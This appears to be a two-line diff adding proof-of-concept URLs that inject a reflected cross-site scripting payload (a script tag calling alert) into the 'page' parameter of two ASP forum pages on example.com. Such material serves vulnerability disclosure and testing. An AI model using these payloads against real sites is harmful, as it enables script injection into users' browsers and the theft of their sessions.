@@ -1,0 +1,2 @@
+http://www.example.com:80/dispbbs.asp?boardid=1&id=1&page="><script>alert(/liscker/);</script>
+http://www.example.com:80/forum1/list.asp?boardid=1&id=1&page=><script>alert(/liscker/);</script>
